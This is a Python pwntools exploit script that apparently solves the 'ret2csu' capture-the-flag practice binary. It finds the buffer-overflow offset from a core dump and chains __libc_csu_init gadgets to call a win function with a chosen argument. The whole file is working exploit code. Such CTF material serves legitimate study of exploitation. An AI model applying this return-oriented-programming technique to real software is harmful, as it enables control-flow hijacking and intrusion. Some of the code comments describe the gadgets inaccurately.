#!/usr/bin/env python2

from pwn import *



elf = context.binary = ELF('ret2csu')

#context.log_level = 'debug'
p = process(elf.path)


AddressPopRegisters = 0x000000000040089a 		#address of the fist gadget to pop R12,R15,RBX,RBP
AddressMovetoRDX = 0x0000000000400880 			#second gadget to move R15 into RBX
finiPointer = 0x600e38							#pointer to the address of a function (Init) does modify any register that we are using
ArgumentWinFunction = 0xdeadcafebabebeef		#value for the argument
WinFunctionAddress = 0x004007b1					#function to call address

#send a pattern to calculate the offset
p.sendline(cyclic(70))


#wait for crashing
p.wait()

core = p.corefile
#calculates the correct offset to the return address
offset = core.read(core.rsp,4)
offset = cyclic_find(offset)

pattern = cyclic(offset)
info("offset: %d",len(pattern))


payload = pattern

payload += p64(AddressPopRegisters)			
payload += p64(0x00)					#pop rbx
payload += p64(0x01)					#pop rbp
payload += p64(finiPointer)				#pop r12
payload += p64(0x00)					#pop r13
payload += p64(0x00)					#pop r14
payload += p64(ArgumentWinFunction)		#pop r15
payload += p64(AddressMovetoRDX)		#next gadget
payload += p64(0x00)					#the rest for padding
payload += p64(0x00)					#
payload += p64(0x00)					#
payload += p64(0x00)					#
payload += p64(0x00)					#
payload += p64(0x00)					#
payload += p64(0x00)					#
payload += p64(WinFunctionAddress)		#address of the win function


info("Final payload: %s\nLenght of the payload: %d",payload,len(payload))

#new process to send the payload
p = process(elf.path)
p.sendlineafter(">",payload)

print(p.recvall())











